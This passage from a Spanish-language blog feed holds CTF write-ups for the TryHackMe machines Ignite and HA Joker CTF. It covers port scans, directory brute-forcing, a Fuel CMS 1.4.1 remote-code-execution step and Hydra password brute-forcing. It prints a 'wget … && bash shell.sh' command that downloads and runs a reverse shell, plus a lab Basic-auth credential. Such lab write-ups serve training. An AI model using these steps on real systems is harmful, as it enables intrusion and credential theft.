&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Mar  2 17:50:06 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate 10.10.169.161&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.169.161
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Mar  2 17:51:40 2020 -- 1 IP address (1 host up) scanned in 94.48 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/ignite# gobuster dir -u ignite.thm -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt 
/0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/offline &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Pagina en el puerto 80, en esta nos muestra los pasos que se deben de seguir para instalar el Fuel CMS.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_175351.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En una de las instrucciones nos muestra las credenciales para ingresar en el dashboard de este CMS.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_175552.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Entramos en el CMS con las credenciales.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_175724.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce-fuel-cms-141&#34;&gt;RCE Fuel CMS 1.4.1&lt;/h2&gt;
&lt;p&gt;Buscamos un exploit para este CMS encontramos uno para ejecutar comandos, este exploit necesita burpsuite para poder funcionar en el puerto 8080 aunque no es necesario. Ejecutamos un comando y vemos los archivos del sistema.&lt;br /&gt;
&lt;a href=&#34;https://www.exploit-db.com/exploits/47138&#34;&gt;&lt;strong&gt;Fuel CMS 1.4.1&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_181910.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un archivo bash en el que contiene nuestra shell inversa, descargamos y ejecutamos nuestra shell.&lt;/p&gt;
&lt;p&gt;Exploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cmd:wget 10.8.1.72/shell.sh &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell inversa con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_182216.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt; en la carpeta &lt;code&gt;/home&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_182505.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos los archivos en la maquina, en los archivos del CMS encontramos las credenciales de la base de datos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_183744.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos su con la contraseña de root y obtenemos una shell y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ignite/Screenshot_20200302_183945.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/ignite/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/ignite/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - HA Joker CTF</title>
        <link>https://sckull.github.io/posts/jokerctf/</link>
        <pubDate>Thu, 27 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 27 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/jokerctf/</guid>
        <description>HA Joker CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;HA Joker CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;HA Joker CTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Batman hits Joker.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3940&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ki11switch&#34;&gt;ki11switch&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Feb 27 14:33:03 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate jokerctf.thm&lt;/span&gt;
Warning: 10.10.171.105 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; jokerctf.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.171.105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
8080/tcp open  http    Apache httpd 2.4.29
Service Info: Host: localhost&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Feb 27 14:34:50 2020 -- 1 IP address (1 host up) scanned in 107.72 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;En el puerto 80 encontramos una pagina que nos muestra distintas imagenes del &lt;code&gt;joker&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_143734.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/jokerctf# gobuster dir -u http://jokerctf.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/phpinfo.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/phpinfo.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/secret.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/jokerctf#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;secrettxt&#34;&gt;/secret.txt&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_144432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---puerto-8080&#34;&gt;HTTP - Puerto 8080&lt;/h2&gt;
&lt;p&gt;En el puerto 8080 encontramos un panel donde nos pide un usuario y contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_144028.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;hydra&#34;&gt;Hydra&lt;/h3&gt;
&lt;p&gt;Utilizamos hydra con los usuarios joker y batman junto con el wordlist &lt;code&gt;rockyou.txt&lt;/code&gt; en el puerto 8080.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_145432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al iniciar sesion con las credenciales vemos una nueva pagina, a simple vista podemos ver que es un CMS Joomla.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/jokerctf/Screenshot_20200227_145545.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos RUSTBUSTER para busqueda de directorios y archivos (por alguna razon gobuster no aceptaba los headers).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/jokerctf# /opt/rustbuster/rustbuster dir -u http://jokerctf.thm:8080/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -e php,html,txt -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=et845u1qtnkv5io3ak6msfmdim; 0d073d2ec68ac2f24f859831bbe8843b=3r1udjnnh7dk8bv4jt7gpadh5r&amp;#34;&lt;/span&gt;
~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
